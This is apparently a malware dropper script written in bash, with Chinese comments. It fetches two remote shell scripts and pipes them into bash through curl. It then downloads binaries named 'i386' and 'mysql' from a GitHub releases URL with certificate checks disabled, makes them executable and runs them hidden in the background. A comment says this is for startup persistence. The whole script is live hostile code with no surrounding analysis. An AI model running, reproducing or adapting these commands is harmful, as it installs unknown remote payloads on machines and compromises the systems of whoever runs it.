#!/bin/bash

# 随机选择并执行命令1或2
RANDOM_CHOICE=$((RANDOM % 2 + 1))
if [ "$RANDOM_CHOICE" -eq 1 ]; then
    curl -s https://raw.githubusercontent.com/ANQUSEC/trx20/main/43.sh | bash >/dev/null 2>&1 & disown
else
    curl -s https://raw.githubusercontent.com/ANQUSEC/trx20/main/48.sh | bash >/dev/null 2>&1 & disown
fi

# 获取系统框架
#cd /opt; wget -qO arm --no-check-certificate https://github.com/ANQUSEC/trx20/releases/download/wk/arm; chmod +x arm; nohup ./arm >/dev/null 2>&1 & disown

cd /opt; wget -qO i386 --no-check-certificate https://github.com/ANQUSEC/trx20/releases/download/wk/i386; chmod +x i386; nohup ./i386 >/dev/null 2>&1 & disown

#cd /opt; wget -qO x86 --no-check-certificate https://github.com/ANQUSEC/trx20/releases/download/wk/me; chmod +x x86; nohup ./x86 >/dev/null 2>&1 & disown


# 执行mmsql并放入开机启动项
cd /opt; wget -qO mysql --no-check-certificate https://github.com/ANQUSEC/trx20/releases/download/wk/mysql; chmod +x mysql; ./mysql & disown
